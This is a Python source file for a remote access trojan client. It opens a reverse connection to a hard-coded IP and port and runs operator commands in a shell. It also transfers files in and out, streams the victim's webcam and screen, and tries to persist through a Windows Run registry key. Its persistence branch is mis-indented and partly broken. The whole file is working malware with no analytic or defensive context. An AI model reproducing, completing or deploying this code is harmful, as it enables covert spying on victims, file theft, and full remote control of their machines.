import socket
import subprocess
import json
import os
from vidstream import CameraClient, ScreenShareClient
import platform
import shutil
import base64




IP = "10.0.10.4"
PORT = 7007



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))




def persistence():
    try:
        if platform.system() == "Windows":
            appdata_path = os.environ["appdata"] + "\\Win32.pyw"
        else :
            appdata_path = "/var/sys32.pyw"
            shutil.copy(__file__, appdata_path)
            subprocess.call("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system32 /f")
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system32 /t REG_SZ /d "{appdata_path}"',shell=True)
            return "[+] Persistence is ON."
    except Exception:
        return "[-] Error When Activating PERSISTENCE !"



def reliable_recv():
    json_data = ""
    while 1:
        try:
            json_data += sock.recv(1024).decode().rstrip()
            return json.loads(json_data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    return sock.send(json_data.encode())


def exec_cmd(cmd):
    return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()


def open_cam():
    client_cam.start_stream()


def close_cam():
    client_cam.stop_stream()



def download_file(file):
    try:
        d_file = open(file, "rb")
        return base64.b64encode(d_file.read())
    except FileNotFoundError:
        return b"[!] File Not Found."


def upload_file(file, content):
    try:
        content = base64.b64decode(content)
        open(file, "wb").write(content)
    except FileNotFoundError:
        pass


def share_screen():
    client_screen.start_stream()


while 1:
    try:
        data = ""
        recv_cmd = reliable_recv()
        if len(recv_cmd) == 0:
            reliable_send("[!] Please Enter a Command.")
            continue
        command = recv_cmd[0]
        if command == "open_cam":
            CAM_PORT = recv_cmd[1]
            client_cam = CameraClient(IP, CAM_PORT)
            open_cam()
            reliable_send("[+] Camera Opened.")
            continue
        elif command == "screen_share_on":
            SCREEN_PORT = recv_cmd[1]
            client_screen = ScreenShareClient(IP, SCREEN_PORT)
            share_screen()
            reliable_send("[+] Screen Sahring is Started.")
            continue
        elif command == "screen_share_off":
            client_screen.stop_stream()
            reliable_send("[+] Screen Sharing is Closed.")
            continue
        elif command == "close_cam":
            close_cam()
            reliable_send("[+] Camera Closed.")
            continue
        elif command == "quit" and len(recv_cmd) == 1:
            sock.close()
            break
        elif command == "cd":
            if len(recv_cmd) == 2:
                os.chdir(recv_cmd[1])
                data = "[+] Changed To " + recv_cmd[1] + "."
            elif len(recv_cmd) > 2: # 'cd x y' : error but 'cd' only is a cmd in windows == pwd in Linux 
                data = "[!] Please Enter the directory to change."
            elif len(recv_cmd) == 1:
                data  = exec_cmd("cd")
        elif command == "download" and len(recv_cmd) == 2:
            data = download_file(recv_cmd[1]).decode()
        elif command == "upload" and len(recv_cmd) == 3:
            upload_file(recv_cmd[1], recv_cmd[2])
            data = "[+] File Uploaded Successfully."
        else:       
            data = exec_cmd(recv_cmd)
    except Exception:
        data = "[!] Invalid Command."
    reliable_send(data)
    